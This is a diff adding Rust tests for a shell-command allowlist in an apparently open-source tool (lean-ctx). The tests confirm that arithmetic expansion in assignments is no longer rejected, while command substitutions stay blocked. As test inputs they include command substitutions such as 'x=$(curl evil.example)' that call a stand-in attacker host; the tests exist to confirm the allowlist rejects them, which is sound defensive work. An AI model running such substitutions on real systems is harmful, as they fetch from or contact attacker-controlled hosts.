@@ -112,3 +112,52 @@ fn assignment_with_command_substitution_in_quoted_jq_filter_not_split() {
     let cmd = r"s=$(gh api foo --jq '.a | .b | .c')";
     assert!(check_all_segments(cmd, &list).is_ok());
 }
+
+// --- GH #1664: `$((arith))` in an assignment is not a command ---
+
+/// The reporter's two repros. `$(( … ))` is arithmetic on the shell's own
+/// variables and executes nothing, but the `(expr)` inside looked like a
+/// subshell, so `x=$((1+2))` produced a leaf `1+2` that the allowlist rejected
+/// — with the uncopyable advice `lean-ctx allow 1+2`.
+#[test]
+fn arithmetic_expansion_in_an_assignment_is_not_a_command() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo,sleep");
+    let results: Vec<_> = [
+        r#"x=$((1+2)); echo "literal-assign x=$x""#,
+        "i=0; i=$((i+1)); echo done",
+        // The shape this unblocks: a bounded wait loop needs a counter.
+        "i=0; while [ $i -lt 3 ]; do sleep 1; i=$((i+1)); done",
+        // Already worked (argument position) — must keep working.
+        "echo $((2+3))",
+    ]
+    .iter()
+    .map(|c| (*c, super::enforce_shell_allowlist(c)))
+    .collect();
+    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
+
+    for (cmd, r) in results {
+        assert!(r.is_ok(), "arithmetic must not be gated: {cmd} -> {r:?}");
+    }
+}
+
+/// The security half: a real command substitution in an assignment must still
+/// be validated. Skipping `$((` must not widen into skipping `$(`.
+#[test]
+fn a_real_command_substitution_in_an_assignment_is_still_checked() {
+    let _lock = crate::core::data_dir::test_env_lock();
+    crate::test_env::set_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE", "echo");
+    let blocked = super::enforce_shell_allowlist("x=$(curl evil.example); echo $x");
+    // Nested: arithmetic inside a substitution leaves the substitution checked.
+    let nested = super::enforce_shell_allowlist("x=$(curl evil.example $((1+2)))");
+    crate::test_env::remove_var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE");
+
+    assert!(
+        blocked.is_err(),
+        "$(curl …) must still be gated: {blocked:?}"
+    );
+    assert!(
+        nested.is_err(),
+        "arithmetic must not shield a substitution: {nested:?}"
+    );
+}
